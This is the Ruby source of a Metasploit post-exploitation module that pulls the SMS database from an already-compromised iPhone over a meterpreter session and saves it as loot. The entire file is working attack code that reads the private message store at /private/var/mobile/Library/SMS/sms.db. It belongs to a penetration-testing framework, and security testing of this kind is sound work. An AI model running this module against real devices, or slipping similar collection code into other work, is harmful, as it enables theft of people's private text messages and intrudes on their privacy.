##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          =>  'iOS Text Gatherer',
      'Description'   =>  %q{
        This module collects text messages from iPhones.
        Tested on iOS 10.3.3 on an iPhone 5.
      },
      'License'       =>  MSF_LICENSE,
      'Author'        =>  [ 'Shelby Pace' ], # Metasploit Module
      'Platform'      =>  [ 'apple_ios' ],
      'SessionTypes'  =>  [ 'meterpreter' ]
    ))
  end

  def download_text_db(file_path)
    db_file_data = read_file(file_path)
    loc = store_loot('sms.db.file', 'text/plain', session, db_file_data, 'sms.db')
    print_good("sms.db stored at #{loc}")
  rescue
    fail_with(Failure::NoAccess, "Failed to read sms.db file")
  end

  def run
    sms_path = '/private/var/mobile/Library/SMS/sms.db'
    unless file?(sms_path)
      fail_with(Failure::NotFound, "Couldn't locate sms.db file")
    end

    print_good('sms.db file found')
    download_text_db(sms_path)
  end
end
